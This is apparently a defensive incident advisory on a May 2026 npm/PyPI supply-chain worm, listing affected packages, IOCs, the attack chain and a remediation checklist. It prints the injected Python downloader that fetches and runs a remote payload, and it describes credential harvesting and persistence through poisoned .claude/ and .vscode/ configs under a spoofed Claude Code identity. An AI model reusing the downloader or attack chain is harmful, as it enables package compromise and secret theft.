# Mini Shai-Hulud / TeamPCP Supply Chain Attack — May 11, 2026

**Source:** Postmortem from TanStack, Socket.dev, SafeDep, Snyk, Wiz Blog
**Date:** 2026-05-11, ~19:20–19:26 UTC
**CVE:** CVE-2026-45321 (CVSS 9.6)
**GHSA:** GHSA-g7cv-rxg3-hmpx
**Attribution:** TeamPCP

---

## Attack Summary

A coordinated supply-chain attack compromising **170+ npm packages** and **2 PyPI packages** (404 malicious versions total). The attacker chained `pull_request_target` abuse, GitHub Actions cache poisoning, and OIDC token extraction from runner memory to publish malicious versions through the project's own trusted-publisher binding (no npm tokens stolen).

---

## Affected Package Scope

| Organization | Packages | Malicious Versions |
|---|---|---|
| `@tanstack` (router family) | 42 | 2 each (total 84) |
| `@mistralai` (npm) | 3 | 3 each |
| `@uipath` | 65 | 1 each |
| `@opensearch-project/opensearch` | 1 (JS client, 1.3M weekly) | 4 |
| `@squawk` | 20 | 5 each |
| `@tallyui` | 10 | 3 each |
| `@beproduct/nestjs-auth` | 1 | 18 |
| **PyPI:** `mistralai` | 1 | 2.4.6 |
| **PyPI:** `guardrails-ai` | 1 | 0.10.1 |

### Notable @tanstack/* Affected Versions

| Package | Malicious | Patched |
|---|---|---|
| `@tanstack/react-router` | 1.169.5, 1.169.8 | 1.169.9 |
| `@tanstack/router-core` | 1.169.5, 1.169.8 | 1.169.9 |
| `@tanstack/react-start` | 1.167.68, 1.167.71 | 1.167.72 |
| `@tanstack/history` | 1.161.9, 1.161.12 | 1.161.13 |
| `@tanstack/router-utils` | 1.161.11, 1.161.14 | 1.161.15 |
| `@tanstack/virtual-file-routes` | 1.161.10, 1.161.13 | 1.161.14 |
| `@tanstack/start-fn-stubs` | 1.161.9, 1.161.12 | 1.161.13 |
| `@tanstack/solid-router` | 1.169.5, 1.169.8 | 1.169.9 |
| `@tanstack/vue-router` | 1.169.5, 1.169.8 | 1.169.9 |
| All others in advisory | — | — |

**Clean families (confirmed):** `@tanstack/query*`, `@tanstack/table*`, `@tanstack/form*`, `@tanstack/virtual*`, `@tanstack/store`, `@tanstack/start` (meta-package, not `@tanstack/start-*`).

---

## Indicators of Compromise

### File Hashes

| File | SHA256 | Size |
|---|---|---|
| `router_init.js` | `ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c` | ~2.3 MB |
| `@mistralai/mistralai@2.2.2` (package tarball) | `ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01` | — |

### Malicious File Names

Search these on disk during local verification:

- `router_init.js` — primary payload (obfuscated, ~2.3 MB)
- `tanstack_runner.js` — variant 2 runner script
- `router_runtime.js` — self-copy for persistence
- `vite_setup.mjs` — commit payload file (~30,000 lines)
- `setup.mjs` — downloader script

### C2 / Exfiltration Infrastructure

| Target | Purpose |
|---|---|
| `filev2.getsession.org/file/` | File upload endpoint (Session P2P network) |
| `seed1.getsession.org` | Session seed node |
| `seed2.getsession.org` | Session seed node |
| `seed3.getsession.org` | Session seed node |
| `83.142.209.194` | PyPI variant C2 (serve `transformers.pyz`) |
| `git-tanstack.com` | PyPI variant file server (Cloudflare-flagged phishing) |
| `api.github.com/search/commits` | Hidden C2 channel (used to check-in) |

### Persistence / Propagation Artifacts

The malware pushes poisoned configs into victim repos via GraphQL `createCommitOnBranch`:

```
.claude/settings.json
.claude/setup.mjs
.claude/router_runtime.js
.vscode/settings.json
.vscode/tasks.json
.vscode/setup.mjs
```

**Git author to watch:** `claude@users.noreply.github.com` (spoofed Claude Code identity)

---

## Attack Chain (TanStack Variant)

1. **Fork evasion** — Attacker creates fork `zblgg/configuration` (renamed from fork of `TanStack/router` to avoid fork-list discovery)
2. **Malicious commit** — Pushed with `[skip ci]` prefix, authored as `claude <claude@users.noreply.github.com>`, adds `packages/history/vite_setup.mjs`
3. **PR opened** — "WIP: simplify history build" against `TanStack/router#main`
4. **pull_request_target triggers** — `bundle-size.yml` runs automatically (no first-time-contributor gate), checks out PR merge commit, `pnpm install` runs → `vite_setup.mjs` executes
5. **Cache poisoning** — The runner saves 1.1 GB cache entry keyed `Linux-pnpm-store-6f9233...` scoped to `refs/heads/main` — matches what `release.yml` will use
6. **PR erased** — Force-pushed back to main HEAD (0-file no-op), PR closed, branch deleted. Cache poison persists.
7. **Detonation** — Legitimate maintainer PR merge triggers `release.yml`. Poisoned cache RESTORED. Malware runs during test phase.
8. **OIDC token extracted** — Malware reads runner memory for the OIDC token
9. **Publish** — Malware mints npm publish tokens via OIDC trusted-publisher, publishes 84 malicious versions in 6 minutes
10. **Detection** — External researcher ashishkurmi (StepSecurity) opens issue within ~20 minutes

---

## Payload Capabilities

The `router_init.js` (~2.3 MB, obfuscated via `javascript-obfuscator` + XOR) is a self-contained worm:

- **Daemonization** — Spawns detached child with `detached: true, stdio: ignore`, parent exits cleanly
- **Credential harvesting** — AWS (IMDSv2, ECS, Secrets Manager, SSM), GCP metadata, K8s service-account tokens, Vault tokens, `~/.npmrc`, GitHub tokens (env, gh CLI, `.git-credentials`), SSH private keys (`~/.ssh/`)
- **Exfiltration** — Session P2P network (encrypted, no C2 to block, dynamic snode routing)
- **Self-propagation** — Enumerates victim packages via `registry.npmjs.org/-/v1/search?text=maintainer:<user>`, republishes with same injection
- **IDE persistence** — `.claude/` and `.vscode/` config poisoning for re-trigger on clone/open
- **Sigstore deception** — Generates valid provenance attestations so compromised packages appear clean

### PyPI Variant

Injected into `__init__.py` of `mistralai` and `guardrails-ai`:

```python
import urllib.request, subprocess, os, sys
if sys.platform.startswith("linux"):
    URL = "https://git-tanstack.com/transformers.pyz"
    PATH = "/tmp/transformers.pyz"
    req = urllib.request.Request(URL, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req) as response, open(PATH, 'wb') as out_file:
        out_file.write(response.read())
    subprocess.run(["python3", PATH])
```

Key difference: fires on `import`, not `pip install`. Malicious `transformers.pyz` payload runs only on Linux.

---

## Key Sources

- TanStack official postmortem: https://tanstack.com/blog/npm-supply-chain-compromise-postmortem
- GitHub Security Advisory: https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx
- Socket.dev analysis: https://socket.dev/blog/tanstack-npm-packages-compromised-mini-shai-hulud-supply-chain-attack
- Snyk blog: https://snyk.io/blog/tanstack-npm-packages-compromised/
- Wiz blog: https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised
- SafeDep: https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/
- The Hacker News: https://thehackernews.com/2026/05/mini-shai-hulud-worm-compromises.html

---

## Remediation Checklist (if compromise is found)

1. **Isolate the machine** — disconnect network immediately
2. **Rotate ALL secrets** — AWS keys, GCP keys, GitHub tokens/PATs, npm tokens, SSH keys, Vault tokens, K8s service account tokens — from a **clean device**
3. **Revoke GitHub Actions OIDC federation grants** for any npm package published from affected repos
4. **Audit `.claude/` and `.vscode/`** directories in ALL repos — remove unfamiliar entries
5. **Review recent commits** authored by `claude@users.noreply.github.com` — revert and force-push
6. **Block egress** to `filev2.getsession.org` and Session seed nodes
7. **Check cloud provider audit logs** (CloudTrail, GCP Logging, Vault audit) for anomalous access after `2026-05-11T19:20:00Z`
8. **Do NOT trust Sigstore provenance** — compromised packages carry valid attestations
